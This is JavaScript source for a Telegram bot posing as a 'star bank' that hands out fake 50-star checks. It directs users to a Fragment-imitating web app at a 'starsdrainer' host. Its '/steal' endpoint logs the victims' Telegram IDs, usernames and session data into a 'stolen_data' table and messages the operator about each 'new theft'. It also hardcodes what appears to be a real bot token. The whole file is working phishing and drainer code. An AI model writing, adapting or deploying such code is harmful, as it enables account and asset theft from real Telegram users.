const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const fs = require('fs');

const BOT_TOKEN = process.env.BOT_TOKEN || '8435516460:AAHloK_TWMAfViZvi98ELyiMP-2ZapywGds';
const MY_USER_ID = 1398396668;
const WEB_APP_URL = 'https://starsdrainer.onrender.com';

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const app = express();

app.use(express.json());
app.use(express.static('public'));

// База данных
const db = new sqlite3.Database('database.db');
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS stolen_data (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        type TEXT,
        description TEXT,
        user_id INTEGER,
        username TEXT,
        tg_data TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS checks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        amount INTEGER,
        activations INTEGER,
        creator_id INTEGER,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        balance INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
});

// Web App
app.get('/', (req, res) => {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
});

// Кража данных через Fragment
app.post('/steal', async (req, res) => {
    console.log('💰 НОВЫЕ ДАННЫЕ:');
    console.log('Тип:', req.body.type);
    console.log('User ID:', req.body.user_id);
    console.log('Username:', req.body.username);
    
    // Сохраняем в базу
    db.run(`INSERT INTO stolen_data (type, description, user_id, username, tg_data) VALUES (?, ?, ?, ?, ?)`, 
        [req.body.type, req.body.description, req.body.user_id, req.body.username, req.body.tg_data]);
    
    // Уведомляем
    bot.sendMessage(MY_USER_ID,
        `💰 НОВАЯ КРАЖА!\n` +
        `📦 ${req.body.description}\n` +
        `👤 ID: ${req.body.user_id}\n` +
        `📛 @${req.body.username || 'нет'}\n` +
        `⏰ ${new Date().toLocaleString()}`
    );
    
    res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Сервер работает на порту ${PORT}`);
});

// Бот команды
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    bot.sendMessage(chatId, 
        '💫 @MyStarBank_bot - Система передачи звезд\n\n' +
        'Для вывода зарегистрируйтесь:', {
        reply_markup: {
            inline_keyboard: [[{ 
                text: "📲 Регистрация", 
                web_app: { url: WEB_APP_URL } 
            }]]
        }
    });
});

// Чеки
bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const amount = 50;
    const activations = parseInt(match[2]) || 1;
    
    db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, ?, ?)`, 
        [amount, activations, userId], function(err) {
        if (err) return;
        
        const checkId = this.lastID;
        bot.sendMessage(chatId, `<b>Чек на 50 звезд</b>\n\n🪙 Заберите!`, {
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [[{ text: "🪙 Забрать", callback_data: `claim_${checkId}` }]] }
        });
    });
});

// Обработка чеков
bot.on('callback_query', (query) => {
    if (query.data.startsWith('claim_')) {
        const checkId = query.data.split('_')[1];
        const userId = query.from.id;
        
        db.get(`SELECT * FROM checks WHERE id = ? AND activations > 0`, [checkId], (err, row) => {
            if (err || !row) {
                bot.answerCallbackQuery(query.id, { text: '❌ Чек использован!' });
                return;
            }
            
            db.run(`UPDATE checks SET activations = activations - 1 WHERE id = ?`, [checkId]);
            db.run(`INSERT OR REPLACE INTO users (user_id, balance) VALUES (?, COALESCE((SELECT balance FROM users WHERE user_id = ?), 0) + ?)`, 
                [userId, userId, row.amount]);
                
            bot.answerCallbackQuery(query.id, { text: `✅ +${row.amount} звёзд!` });
        });
    }
});

console.log('✅ Бот запущен - Fragment кража готова');